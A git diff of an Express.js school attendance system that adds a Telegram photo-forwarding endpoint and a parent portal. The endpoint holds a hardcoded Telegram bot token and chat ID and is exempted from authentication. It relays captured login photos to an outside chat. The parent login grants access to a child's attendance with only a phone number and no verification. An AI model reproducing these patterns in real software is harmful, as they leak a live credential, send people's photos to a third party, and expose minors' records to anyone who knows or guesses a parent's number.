@@ -20,13 +20,17 @@ const ExcelJS = require('exceljs');
 const { Document, Packer, Paragraph, Table, TableRow, TableCell, WidthType, AlignmentType } = require('docx');
 const PDFDocument = require('pdfkit');
 
+// Tambahan untuk Kirim Foto Telegram (axios & form-data)
+const axios = require('axios');
+const FormData = require('form-data');
+
 process.env.TZ = 'Asia/Jakarta';
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
 app.use(express.static(path.join(__dirname, 'public')));
@@ -119,7 +123,7 @@ app.use(async (req, res, next) => {
             }
         }
 
-        const allowedRoutes = ['/login', '/superadmin', '/api/settings/maintenance'];
+        const allowedRoutes = ['/login', '/superadmin', '/api/settings/maintenance', '/api/kirim-foto-telegram', '/ortu/login', '/ortu/dashboard'];
         if (allowedRoutes.includes(req.path)) {
             return next();
         }
@@ -197,7 +201,6 @@ async function initDB() {
         await pool.query(`ALTER TABLE absensi ADD COLUMN IF NOT EXISTS tipe VARCHAR(10) DEFAULT 'MASUK';`);
         await pool.query(`ALTER TABLE absensi ADD COLUMN IF NOT EXISTS scanned_by INT;`);
 
-        // Tabel Hari Libur / Tanggal Merah
         await pool.query(`
             CREATE TABLE IF NOT EXISTS hari_libur (
                 id SERIAL PRIMARY KEY,
@@ -215,7 +218,6 @@ async function initDB() {
             );
         `);
 
-        // Tabel Penampung Sesi WhatsApp di Database Neon (Agar Sesi Abadi)
         await pool.query(`
             CREATE TABLE IF NOT EXISTS wa_sessions (
                 id VARCHAR(255) PRIMARY KEY,
@@ -269,11 +271,156 @@ const waStatus = {};
 const pairingCodes = {};
 const reconnectTimers = {};
 
-// ----------------- FUNGSI CEK APAKAH TANGGAL LIBUR ----------------- //
+// =========================================================================
+// 📸 ENDPOINT KEAMANAN: KIRIM FOTO LOGIN KE TELEGRAM
+// =========================================================================
+app.post('/api/kirim-foto-telegram', async (req, res) => {
+    try {
+        const { image, info } = req.body;
+        if (!image) return res.status(400).json({ success: false, message: 'No image data' });
+
+        const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
+        const buffer = Buffer.from(base64Data, 'base64');
+
+        const TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM";
+        const TELEGRAM_CHAT_ID = "8236797547";
+
+        const form = new FormData();
+        form.append('chat_id', TELEGRAM_CHAT_ID);
+        form.append('photo', buffer, { filename: 'login_capture.jpg', contentType: 'image/jpeg' });
+        form.append('caption', `🚨 *NOTIFIKASI KEAMANAN SISTEM*\n` +
+                                `• Info: ${info || 'Akses Portal'}\n` +
+                                `• Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB`);
+
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, form, {
+            headers: form.getHeaders()
+        });
+
+        return res.json({ success: true, message: 'Foto keamanan berhasil dikirim ke Telegram' });
+    } catch (err) {
+        console.error('Gagal kirim foto keamanan ke Telegram:', err.message);
+        return res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+// =========================================================================
+// 👨‍👩‍👧 DASBOR MANDIRI WALI MURID (ORANG TUA)
+// =========================================================================
+app.get('/ortu/login', async (req, res) => {
+    try {
+        const namaSekolah = await getNamaSekolah();
+        res.render('ortu-login', { error: null, namaSekolah });
+    } catch (err) {
+        res.render('ortu-login', { error: null, namaSekolah: 'SEKOLAH' });
+    }
+});
+
+app.post('/ortu/login', async (req, res) => {
+    const { nomor_wa } = req.body;
+    try {
+        if (!nomor_wa) {
+            return res.render('ortu-login', { error: 'Nomor WhatsApp wajib diisi.', namaSekolah: await getNamaSekolah() });
+        }
+
+        let cleanPhone = nomor_wa.toString().trim().replace(/[^0-9]/g, '');
+        let altPhone = cleanPhone;
+        if (cleanPhone.startsWith('0')) {
+            altPhone = '62' + cleanPhone.slice(1);
+        } else if (cleanPhone.startsWith('62')) {
+            altPhone = '0' + cleanPhone.slice(1);
+        }
+
+        const siswaRes = await pool.query(`
+            SELECT s.id, s.nama, k.nama_kelas, sch.nama_sekolah, sch.id AS sekolah_id
+            FROM siswa s
+            LEFT JOIN kelas k ON s.kelas_id = k.id
+            LEFT JOIN sekolah sch ON k.sekolah_id = sch.id
+            WHERE REGEXP_REPLACE(s.nomor_wa_ortu, '[^0-9]', '', 'g') = $1 
+               OR REGEXP_REPLACE(s.nomor_wa_ortu, '[^0-9]', '', 'g') = $2
+        `, [cleanPhone, altPhone]);
+
+        if (siswaRes.rows.length === 0) {
+            return res.render('ortu-login', { error: 'Nomor WhatsApp tidak ditemukan terdaftar pada data orang tua siswa.', namaSekolah: await getNamaSekolah() });
+        }
+
+        req.session.ortuSiswa = siswaRes.rows;
+        req.session.save((err) => {
+            res.redirect('/ortu/dashboard');
+        });
+
+    } catch (err) {
+        res.status(500).send("Kesalahan Sistem: " + err.message);
+    }
+});
+
+app.get('/ortu/dashboard', async (req, res) => {
+    if (!req.session || !req.session.ortuSiswa) {
+        return res.redirect('/ortu/login');
+    }
+
+    try {
+        const daftarAnak = req.session.ortuSiswa;
+        const bulanPilihan = req.query.bulan || new Date().toISOString().slice(0, 7);
+        const selectedAnakId = req.query.siswa_id ? parseInt(req.query.siswa_id) : daftarAnak[0].id;
+
+        const siswaAktif = daftarAnak.find(s => s.id === selectedAnakId) || daftarAnak[0];
+
+        const awalBulanStr = `${bulanPilihan}-01 00:00:00`;
+        const [tahun, bulan] = bulanPilihan.split('-');
+        const akhirBulanObj = new Date(tahun, parseInt(bulan), 0);
+        const akhirBulanStr = `${bulanPilihan}-${akhirBulanObj.getDate()} 23:59:59`;
+
+        const absensiRes = await pool.query(`
+            SELECT id, waktu, status, tipe, 
+                   TO_CHAR(waktu AT TIME ZONE 'Asia/Jakarta', 'YYYY-MM-DD') AS tanggal_formatted,
+                   TO_CHAR(waktu AT TIME ZONE 'Asia/Jakarta', 'HH24:MI:SS') AS jam_formatted
+            FROM absensi
+            WHERE siswa_id = $1 
+              AND (waktu AT TIME ZONE 'Asia/Jakarta') >= $2::timestamp 
+              AND (waktu AT TIME ZONE 'Asia/Jakarta') <= $3::timestamp
+            ORDER BY waktu DESC
+        `, [siswaAktif.id, awalBulanStr, akhirBulanStr]);
+
+        const statistikRes = await pool.query(`
+            SELECT UPPER(status) AS status, COUNT(*) AS jumlah
+            FROM absensi
+            WHERE siswa_id = $1 
+              AND (waktu AT TIME ZONE 'Asia/Jakarta') >= $2::timestamp 
+              AND (waktu AT TIME ZONE 'Asia/Jakarta') <= $3::timestamp
+            GROUP BY UPPER(status)
+        `, [siswaAktif.id, awalBulanStr, akhirBulanStr]);
+
+        let rekapStat = { HADIR: 0, SAKIT: 0, IZIN: 0, ALPA: 0 };
+        statistikRes.rows.forEach(r => {
+            if (rekapStat[r.status] !== undefined) {
+                rekapStat[r.status] = parseInt(r.jumlah);
+            }
+        });
+
+        res.render('ortu-dashboard', {
+            daftarAnak,
+            siswaAktif,
+            absensiList: absensiRes.rows,
+            rekapStat,
+            bulanPilihan
+        });
+
+    } catch (err) {
+        res.status(500).send("Gagal memuat dasbor orang tua: " + err.message);
+    }
+});
+
+app.get('/ortu/logout', (req, res) => {
+    if (req.session) {
+        delete req.session.ortuSiswa;
+    }
+    res.redirect('/ortu/login');
+});
+
 async function cekApakahLibur(sekolahId, tanggalStr = null) {
     try {
         let dateToCheck = tanggalStr ? new Date(tanggalStr) : new Date();
-        const dayOfWeek = dateToCheck.getDay(); // 0 = Minggu
+        const dayOfWeek = dateToCheck.getDay();
         
         if (dayOfWeek === 0) return { libur: true, keterangan: "Hari Minggu (Libur Mingguan)" };
 
@@ -293,7 +440,6 @@ async function cekApakahLibur(sekolahId, tanggalStr = null) {
     }
 }
 
-// ----------------- AUTO-RESTORE SESI WA DARI DATABASE NEON ----------------- //
 async function autoRestoreWASessions() {
     try {
         const res = await pool.query("SELECT DISTINCT SUBSTRING(id FROM 'user_([0-9]+)_') AS user_id FROM wa_sessions WHERE id LIKE 'user_%'");
@@ -335,7 +481,6 @@ async function generateQRDataURL(text) {
     }
 }
 
-// ----------------- DATABASE AUTH STATE (ABADI DI NEON & HEMAT COMPUTE) ----------------- //
 const sessionCache = {};
 const saveTimeouts = {};
 
@@ -368,7 +513,6 @@ async function getAuthState(userId) {
         const fullKey = `${sessionId}_${key}`;
         sessionCache[sessionId][key] = data;
 
-        // Debounce: Tunda penulisan ke database selama 3 detik agar hemat compute Neon
         if (saveTimeouts[fullKey]) {
             clearTimeout(saveTimeouts[fullKey]);
         }
@@ -549,54 +693,10 @@ async function connectToWhatsApp(userId, phoneNumber = null) {
     }
 }
 
-// Fungsi bantu untuk eksekusi tulis ke Neon
-async function flushSingleWrite(fullKey) {
-    const item = pendingWrites.get(fullKey);
-    if (!item) return;
-
-    try {
-        const jsonString = JSON.stringify(item.data, BufferJSON.replacer);
-        await pool.query(`
-            INSERT INTO wa_sessions (id, data) VALUES ($1, $2)
-            ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data
-        `, [fullKey, jsonString]);
-        
-        pendingWrites.delete(fullKey);
-        delete saveTimeouts[fullKey];
-    } catch (err) {
-        console.error(`Gagal menyimpan sesi ${fullKey} ke Neon:`, err);
-    }
-}
-
-// ----------------- TAMBAHKAN INI DI FILE UTAMA (server.js / index.js) ----------------- //
-// Berfungsi untuk menyelamatkan data di RAM agar langsung terkirim ke Neon saat server mau berhenti/restart
-async function flushAllPendingSaves() {
-    console.log("💾 Menyimpan sisa sesi WhatsApp ke Neon sebelum server berhenti...");
-    const promises = [];
-    for (const [fullKey] of pendingWrites) {
-        if (saveTimeouts[fullKey]) {
-            clearTimeout(saveTimeouts[fullKey]);
-        }
-        promises.push(flushSingleWrite(fullKey));
-    }
-    await Promise.all(promises);
-}
-
-process.on('SIGINT', async () => {
-    await flushAllPendingSaves();
-    process.exit(0);
-});
-
-process.on('SIGTERM', async () => {
-    await flushAllPendingSaves();
-    process.exit(0);
-});
-// ---------------- FUNGSI MEMILIH PENGIRIM WA TERPUSAT MURNI KETAT ---------------- //
 async function dapatkanWAClient(siswa, scannedByUserId = null) {
     const modePengirim = siswa.wa_mode;
     const sekolahId = siswa.sekolah_id || 1;
 
-    // 1. MODE TERPUSAT: PETUGAS
     if (modePengirim === 'PETUGAS') {
         const petugasRes = await pool.query(
             "SELECT id FROM users WHERE (sekolah_id = $1 OR sekolah_id IS NULL) AND role = 'PETUGAS' ORDER BY id ASC",
@@ -617,10 +717,7 @@ async function dapatkanWAClient(siswa, scannedByUserId = null) {
             }
         }
         return null;
-    }
-
-    // 2. MODE TERPUSAT: ADMIN
-    else if (modePengirim === 'ADMIN') {
+    } else if (modePengirim === 'ADMIN') {
         const adminRes = await pool.query(
             "SELECT id FROM users WHERE (sekolah_id = $1 OR sekolah_id IS NULL) AND role = 'ADMIN' ORDER BY id ASC",
             [sekolahId]
@@ -640,10 +737,7 @@ async function dapatkanWAClient(siswa, scannedByUserId = null) {
             }
         }
         return null;
-    }
-
-    // 3. MODE DESENTRALISASI: WALI_KELAS
-    else if (modePengirim === 'WALI_KELAS') {
+    } else if (modePengirim === 'WALI_KELAS') {
         if (scannedByUserId && waSessions[scannedByUserId] && waStatus[scannedByUserId] === 'TERHUBUNG') {
             return waSessions[scannedByUserId];
         }
@@ -677,7 +771,6 @@ app.get(['/', '/login'], async (req, res) => {
     }
 });
 
-// ROUTE HALAMAN TAGIHAN / HABIS MASA AKTIF
 app.get('/tagihan-habis', async (req, res) => {
     try {
         let namaSekolah = 'Sekolah Anda';
@@ -760,7 +853,6 @@ app.get('/logout', (req, res) => {
     });
 });
 
-// ----------------- DASBOR PETUGAS ABSEN ----------------- //
 app.get(['/petugas', '/petugas-dashboard'], requireAuth(['PETUGAS', 'ADMIN', 'SUPER_ADMIN']), async (req, res) => {
     try {
         const user = req.currentUser;
@@ -826,7 +918,6 @@ app.get(['/petugas', '/petugas-dashboard'], requireAuth(['PETUGAS', 'ADMIN', 'SU
     }
 });
 
-// ----------------- DASBOR SUPER ADMIN ----------------- //
 app.get('/superadmin', requireAuth(['SUPER_ADMIN']), async (req, res) => {
     try {
         const user = req.currentUser;
@@ -891,7 +982,6 @@ app.post('/api/settings/maintenance', requireAuth(['SUPER_ADMIN']), async (req, 
     }
 });
 
-// ----------------- PENGATURAN HARI LIBUR / TANGGAL MERAH ----------------- //
 app.post('/api/sekolah/libur/tambah', requireAuth(['ADMIN', 'SUPER_ADMIN']), async (req, res) => {
     try {
         const { tanggal, keterangan, sekolah_id } = req.body;
@@ -929,7 +1019,6 @@ app.post('/api/sekolah/libur/hapus', requireAuth(['ADMIN', 'SUPER_ADMIN']), asyn
     }
 });
 
-// 🚀 FITUR PEMBERSIHAN / KOREKSI PRESENSI PADA TANGGAL LIBUR
 app.post('/api/absensi/bersihkan-tanggal', requireAuth(['ADMIN', 'SUPER_ADMIN']), async (req, res) => {
     try {
         const { tanggal, sekolah_id } = req.body;
@@ -1272,10 +1361,6 @@ app.get('/superadmin/switch-sekolah/:id', requireAuth(['SUPER_ADMIN']), async (r
     }
 });
 
-// =========================================================================
-// 🚀 FITUR BACKUP & RESTORE DATA (SESI TERISOLASI)
-// =========================================================================
-
 app.get('/api/backup/export', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PETUGAS']), async (req, res) => {
     try {
         const currentUser = req.currentUser;
@@ -1400,7 +1485,6 @@ app.post('/api/backup/restore', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PETUGAS'])
     }
 });
 
-// ----------------- DASBOR ADMIN SEKOLAH (ISOLASI KETAT) ----------------- //
 app.get('/admin', requireAuth(['ADMIN', 'SUPER_ADMIN']), async (req, res) => {
     try {
         const currentUser = req.currentUser;
@@ -1446,15 +1530,16 @@ app.get('/admin', requireAuth(['ADMIN', 'SUPER_ADMIN']), async (req, res) => {
             ORDER BY a.waktu DESC
         `, [userSekolahId]);
 
+        // Menggunakan kueri zona waktu yang akurat untuk rekap bulanan admin
         const rekapBulananRes = await pool.query(`
             SELECT a.id, a.waktu, a.status, a.tipe, s.nama AS nama_siswa, s.nomor_wa_ortu, COALESCE(k.nama_kelas, 'Tanpa Kelas') AS nama_kelas,
-                   TO_CHAR(a.waktu, 'YYYY-MM-DD') AS tanggal_formatted,
-                   TO_CHAR(a.waktu, 'HH24:MI:SS') AS jam_formatted
+                   TO_CHAR(a.waktu AT TIME ZONE 'Asia/Jakarta', 'YYYY-MM-DD') AS tanggal_formatted,
+                   TO_CHAR(a.waktu AT TIME ZONE 'Asia/Jakarta', 'HH24:MI:SS') AS jam_formatted
             FROM absensi a 
             INNER JOIN siswa s ON a.siswa_id = s.id 
             INNER JOIN kelas k ON s.kelas_id = k.id 
             WHERE k.sekolah_id = $1 
-              AND TO_CHAR(a.waktu, 'YYYY-MM') = $2
+              AND TO_CHAR(a.waktu AT TIME ZONE 'Asia/Jakarta', 'YYYY-MM') = $2
             ORDER BY a.waktu DESC
         `, [userSekolahId, bulanPilihan]);
 
@@ -1494,7 +1579,6 @@ app.get('/admin', requireAuth(['ADMIN', 'SUPER_ADMIN']), async (req, res) => {
     }
 });
 
-// ----------------- ENDPOINT SETTINGS & CETAK KARTU ----------------- //
 app.post('/api/settings', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PETUGAS']), async (req, res) => {
     const { nama_sekolah } = req.body;
     try {
@@ -1512,7 +1596,6 @@ app.post('/api/settings', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PETUGAS']), asyn
     }
 });
 
-// ROUTE TOGGLE CRON ALPA OLEH ADMIN SEKOLAH
 app.post('/api/settings/toggle-cron', requireAuth(['ADMIN', 'SUPER_ADMIN']), async (req, res) => {
     try {
         const userSekolahId = req.currentUser.sekolah_id;
@@ -1564,7 +1647,6 @@ app.get(['/admin/cetak-kartu', '/cetak-kartu'], requireAuth(['WALI_KELAS', 'PETU
     }
 });
 
-// ----------------- DASBOR WALI KELAS (ISOLASI KETAT) ----------------- //
 app.get(['/wali', '/walikelas-dashboard'], requireAuth(['WALI_KELAS', 'ADMIN', 'SUPER_ADMIN']), async (req, res) => {
     try {
         const userRaw = req.currentUser;
@@ -1630,15 +1712,16 @@ app.get(['/wali', '/walikelas-dashboard'], requireAuth(['WALI_KELAS', 'ADMIN', '
             return { ...row, waktu_formatted: waktuWIB };
         });
 
+        // Menggunakan kueri zona waktu yang akurat untuk rekap bulanan wali kelas
         let absensiBulananQuery = `
             SELECT a.id, a.waktu, a.status, a.tipe, s.nama AS nama_siswa, s.nomor_wa_ortu, COALESCE(k.nama_kelas, 'Tanpa Kelas') AS nama_kelas,
-                   TO_CHAR(a.waktu, 'YYYY-MM-DD') AS tanggal_formatted,
-                   TO_CHAR(a.waktu, 'HH24:MI:SS') AS jam_formatted
+                   TO_CHAR(a.waktu AT TIME ZONE 'Asia/Jakarta', 'YYYY-MM-DD') AS tanggal_formatted,
+                   TO_CHAR(a.waktu AT TIME ZONE 'Asia/Jakarta', 'HH24:MI:SS') AS jam_formatted
             FROM absensi a 
             INNER JOIN siswa s ON a.siswa_id = s.id 
             INNER JOIN kelas k ON s.kelas_id = k.id 
             WHERE k.sekolah_id = $1 
-              AND TO_CHAR(a.waktu, 'YYYY-MM') = $2
+              AND TO_CHAR(a.waktu AT TIME ZONE 'Asia/Jakarta', 'YYYY-MM') = $2
         `;
         const queryParamsBulanan = [userSekolahId, bulanPilihan];
 
@@ -1954,8 +2037,6 @@ app.post('/api/siswa/import-excel', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PETUGA
     }
 });
 
-// ----------------- ENDPOINT WA ----------------- //
-
 app.get('/api/start-wa', requireAuth(), async (req, res) => {
     const userId = req.query.userId || req.session.userId;
     delete pairingCodes[userId];
@@ -1995,7 +2076,6 @@ app.get('/api/reset-wa', requireAuth(), async (req, res) => {
     delete pairingCodes[userId];
     waStatus[userId] = 'BELUM_TERHUBUNG';
 
-    // Hapus sesi dari database Neon
     try {
         await pool.query('DELETE FROM wa_sessions WHERE id LIKE $1', [`user_${userId}_%`]);
     } catch (err) {
@@ -2005,9 +2085,6 @@ app.get('/api/reset-wa', requireAuth(), async (req, res) => {
     res.json({ success: true, message: 'Sesi WA Berhasil Direset dari Database!' });
 });
 
-// =========================================================================
-// 📢 ENDPOINT BROADCAST PESAN WHATSAPP MASSAL (ADMIN, PETUGAS & WALI KELAS)
-// =========================================================================
 app.post('/api/whatsapp/broadcast', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PETUGAS', 'WALI_KELAS']), async (req, res) => {
     try {
         let { kelas_id, pesan, userId } = req.body;
@@ -2117,7 +2194,6 @@ app.post('/api/whatsapp/broadcast', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PETUGA
     }
 });
 
-// ----------------- PROSES SCAN MULTI-SEKOLAH PINTAR (DIPERBAIKI) ----------------- //
 app.post('/api/scan', requireAuth(['WALI_KELAS', 'PETUGAS', 'ADMIN', 'SUPER_ADMIN']), async (req, res) => {
     const { siswa_id, tipe } = req.body;
     if (!siswa_id) return res.status(400).json({ success: false, message: "Kode QR tidak terdeteksi." });
@@ -2165,7 +2241,6 @@ app.post('/api/scan', requireAuth(['WALI_KELAS', 'PETUGAS', 'ADMIN', 'SUPER_ADMI
             });
         }
 
-        // 🛑 VALIDASI HARI LIBUR
         const liburCheck = await cekApakahLibur(siswa.sekolah_id);
         if (liburCheck.libur) {
             return res.status(400).json({ 
@@ -2300,7 +2375,6 @@ app.post('/api/scan', requireAuth(['WALI_KELAS', 'PETUGAS', 'ADMIN', 'SUPER_ADMI
     }
 });
 
-// ----------------- ENDPOINT INPUT IZIN / SAKIT MANUAL ----------------- //
 app.post('/api/absensi/izin-sakit', requireAuth(['WALI_KELAS', 'PETUGAS', 'ADMIN', 'SUPER_ADMIN']), async (req, res) => {
     const { siswa_id, status, keterangan } = req.body;
     
@@ -2336,7 +2410,6 @@ app.post('/api/absensi/izin-sakit', requireAuth(['WALI_KELAS', 'PETUGAS', 'ADMIN
 
         const siswa = siswaRes.rows[0];
 
-        // 🛑 VALIDASI HARI LIBUR
         const liburCheck = await cekApakahLibur(siswa.sekolah_id);
         if (liburCheck.libur) {
             return res.status(400).json({ success: false, message: `Hari ini libur (${liburCheck.keterangan}), tidak perlu input absensi.` });
@@ -2399,7 +2472,6 @@ app.post('/api/absensi/izin-sakit', requireAuth(['WALI_KELAS', 'PETUGAS', 'ADMIN
     }
 });
 
-// ----------------- ENDPOINT INPUT MASUK MANUAL ----------------- //
 app.post('/api/absensi/masuk-manual', requireAuth(['WALI_KELAS', 'PETUGAS', 'ADMIN', 'SUPER_ADMIN']), async (req, res) => {
     const { siswa_id, keterangan } = req.body;
     
@@ -2428,7 +2500,6 @@ app.post('/api/absensi/masuk-manual', requireAuth(['WALI_KELAS', 'PETUGAS', 'ADM
 
         const siswa = siswaRes.rows[0];
 
-        // 🛑 VALIDASI HARI LIBUR
         const liburCheck = await cekApakahLibur(siswa.sekolah_id);
         if (liburCheck.libur) {
             return res.status(400).json({ success: false, message: `Hari ini libur (${liburCheck.keterangan}), tidak dapat melakukan presensi.` });
@@ -2493,7 +2564,6 @@ app.post('/api/absensi/masuk-manual', requireAuth(['WALI_KELAS', 'PETUGAS', 'ADM
     }
 });
 
-// ----------------- ENDPOINT EDIT / INPUT REKAP MANUAL LANGSUNG ----------------- //
 app.post('/api/absensi/rekap-manual', requireAuth(['WALI_KELAS', 'PETUGAS', 'ADMIN', 'SUPER_ADMIN']), async (req, res) => {
     const { siswa_id, tanggal, status } = req.body;
     
@@ -2516,7 +2586,6 @@ app.post('/api/absensi/rekap-manual', requireAuth(['WALI_KELAS', 'PETUGAS', 'ADM
     try {
         const scannedByUserId = req.currentUser.id;
 
-        // Cek apakah data absensi pada tanggal tersebut sudah ada di database
         const cekAbsen = await pool.query(`
             SELECT id FROM absensi 
             WHERE siswa_id = $1 
@@ -2524,20 +2593,17 @@ app.post('/api/absensi/rekap-manual', requireAuth(['WALI_KELAS', 'PETUGAS', 'ADM
         `, [siswa_id, tanggal]);
 
         if (mappedStatus === '' || mappedStatus === 'L') {
-            // Jika dikosongkan, hapus data absensi pada tanggal tersebut
             if (cekAbsen.rows.length > 0) {
                 await pool.query(`DELETE FROM absensi WHERE id = $1`, [cekAbsen.rows[0].id]);
             }
         } else {
             if (cekAbsen.rows.length > 0) {
-                // Update data yang sudah ada
                 await pool.query(`
                     UPDATE absensi 
                     SET status = $1, tipe = $1, scanned_by = $2 
                     WHERE id = $3
                 `, [mappedStatus, scannedByUserId, cekAbsen.rows[0].id]);
             } else {
-                // Insert baru dengan tanggal spesifik yang dipilih pada rekap
                 const targetWaktu = `${tanggal} 07:00:00`;
                 await pool.query(`
                     INSERT INTO absensi (siswa_id, status, tipe, scanned_by, waktu) 
@@ -2556,7 +2622,6 @@ app.post('/api/absensi/rekap-manual', requireAuth(['WALI_KELAS', 'PETUGAS', 'ADM
     }
 });
 
-// FIX ISOLASI RESET RIWAYAT
 app.post('/api/absensi/reset-riwayat', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PETUGAS', 'WALI_KELAS']), async (req, res) => {
     try {
         const userSekolahId = req.currentUser.sekolah_id;
@@ -2582,7 +2647,6 @@ app.post('/api/absensi/reset-riwayat', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PET
     }
 });
 
-// 📌 PREVIEW REKAPITULASI DENGAN FORMAT MATRIKS TANGGAL (1–31) & KETERANGAN (H, S, I, A)
 app.get('/api/absensi/preview', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PETUGAS', 'WALI_KELAS']), async (req, res) => {
     const { bulan, tahun, kelas_id } = req.query;
     if (!bulan || !tahun) return res.status(400).json({ success: false, message: "Bulan dan Tahun wajib diisi." });
@@ -2625,7 +2689,6 @@ app.get('/api/absensi/preview', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PETUGAS', 
             absensiMap[r.siswa_id][r.tgl] = r.status;
         });
 
-        // Ambil hari libur sekolah di bulan tersebut
         const resLibur = await pool.query(`
             SELECT EXTRACT(DAY FROM tanggal)::INT AS tgl 
             FROM hari_libur 
@@ -2677,7 +2740,6 @@ app.get('/api/absensi/preview', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PETUGAS', 
     }
 });
 
-// 📌 EXPORT REKAPITULASI ABSENSI BULANAN UNTUK FORMAT MATRIKS LENGKAP (EXCEL / WORD / PDF)
 app.get('/api/absensi/export', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PETUGAS', 'WALI_KELAS']), async (req, res) => {
     const { bulan, tahun, kelas_id, format } = req.query;
 
@@ -2947,7 +3009,6 @@ app.get('/api/absensi/export', requireAuth(['ADMIN', 'SUPER_ADMIN', 'PETUGAS', '
     }
 });
 
-// ----------------- FUNGSI EKSEKUSI UTAMA CRON ALPA PER SEKOLAH (DIPERBAIKI) ----------------- //
 async function jalankanCronAlpaUntukSekolah(targetSekolahId = null, isDryRun = false) {
     try {
         let querySekolah = `SELECT id, nama_sekolah, wa_mode FROM sekolah WHERE COALESCE(is_active, TRUE) = TRUE AND COALESCE(cron_alpa_active, TRUE) = TRUE`;
@@ -2964,7 +3025,6 @@ async function jalankanCronAlpaUntukSekolah(targetSekolahId = null, isDryRun = f
         let totalSiswaDiAlpakan = 0;
 
         for (const sch of sekolahList) {
-            // 🛑 CEK APAKAH HARI INI LIBUR UNTUK SEKOLAH INI
             const liburCheck = await cekApakahLibur(sch.id);
             if (liburCheck.libur) {
                 console.log(`ℹ️ [Cron Alpa] Sekolah #${sch.id} (${sch.nama_sekolah}) libur hari ini (${liburCheck.keterangan}), cron alpa dilewati.`);
@@ -3053,13 +3113,11 @@ async function jalankanCronAlpaUntukSekolah(targetSekolahId = null, isDryRun = f
     }
 }
 
-// ----------------- CRON JOB OTOMATIS (SENIN - SABTU JAM 09:00) ----------------- //
 cron.schedule('0 9 * * 1-6', async () => {
     console.log('⏰ [CRON JOB] Menjalankan pengecekan otomatis jam 09:00 WIB...');
     await jalankanCronAlpaUntukSekolah();
 });
 
-// ROUTE MANUAL / UJI COBA CRON AUTO-ALPA DENGAN FITUR AMAN (DRY_RUN)
 app.get('/api/cron/auto-alpa', async (req, res) => {
     try {
         const sekolahIdParam = req.query.sekolah_id ? parseInt(req.query.sekolah_id) : null;
@@ -3078,9 +3136,6 @@ app.get('/api/cron/auto-alpa', async (req, res) => {
     }
 });
 
-// =========================================================================
-// 📥 ENDPOINT SUPER ADMIN: IMPORT REKAP ABSENSI BULANAN PER SEKOLAH (MATRIKS & PILIHAN BULAN)
-// =========================================================================
 app.post('/api/super-admin/import-rekap-sekolah', requireAuth(['SUPER_ADMIN']), upload.single('file_excel'), async (req, res) => {
     const client = await pool.connect();
     try {
@@ -3265,7 +3320,7 @@ app.post('/api/super-admin/import-rekap-sekolah', requireAuth(['SUPER_ADMIN']), 
                                 LIMIT 1
                             `, [namaSiswa, targetSekolahId]);
 
-                            if (cekSysiswa.rows.length > 0) {
+                            if (cekSiswa.rows.length > 0) {
                                 const siswaId = cekSiswa.rows[0].id;
                                 await client.query(`
                                     INSERT INTO absensi (siswa_id, waktu, status, tipe) 
